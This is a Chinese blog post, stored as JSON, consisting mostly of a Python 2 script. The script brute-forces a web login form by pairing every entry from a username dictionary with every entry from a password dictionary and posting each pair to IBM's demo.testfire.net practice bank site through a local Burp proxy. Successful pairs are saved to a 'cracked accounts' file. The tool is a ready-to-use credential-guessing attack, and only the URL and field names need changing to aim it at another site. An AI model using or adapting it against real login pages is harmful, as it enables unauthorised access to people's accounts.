{"title": "使用 python 的httplib模块爆破 form 表单的简易脚本 - 个人文章 ", "index": "python,httplib2,urllib,安全", "content": "httplib：\n\n包含了 httplib爆破 web 的 form 表单的使用方法\nhttplib 中代理的添加方法\n\n# -*- coding: utf-8 -*-\nimport urllib\nimport httplib\nimport re\n\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\",\n           \"Content-Type\": \"application/x-www-form-urlencoded\",\n           \"Referer\": \"http://demo.testfire.net/bank/login.aspx\"}\ndef brute_force(user, password):\n    #添加代理\n    conn = httplib.HTTPConnection(\"localhost\",\"8080\")  # 代理,本地 burp 监听一个8080端口,目的是查看发包和回包的情况\n    data = {'uid': user, 'passw': password,'btnSubmit':'Login'}\n    params = urllib.urlencode(data)\n    #测试网站为 IBM 的靶机网站\n    page = conn.request(\"POST\", \"http://demo.testfire.net/bank/login.aspx\", params, headers=headers)  # request页面\n    response = conn.getresponse()#返回的页面\n    status = response.status\n    if status==302:\n        print '---- find user:', user, ' with password:',password, '-----'+'\\n'\n        outFile.write(user + ':' + password + '\\n')\n    else:\n        print '----- error user:', user.replace('\\n',''), ' with password:',password.replace('\\n','') , '-----'\n    return\n\n\noutFile = open('accounts-cracked.txt', 'w')\n\nif __name__ == '__main__':\n    with open('user.dic', 'r') as userline:\n        y = userline.readlines()\n        with open('pass.dic', 'r') as passline:\n            b= passline.readlines()\n            for u in y:\n                for p in b:\n                    brute_force(user=u.replace('\\n',''),password=p.replace('\\n',''))\noutFile.close()\nwith open('accounts-cracked.txt','r') as text:\n    list = text.readlines()\n    sum=len(list)\n\nif sum>0:\n    print \"找到\",sum,\"个账号密码\"\nelse:\n    print \"All thread OK,maybe not \"\n\n\n                ", "mainLikeNum": ["0 "], "mainBookmarkNum": "0"}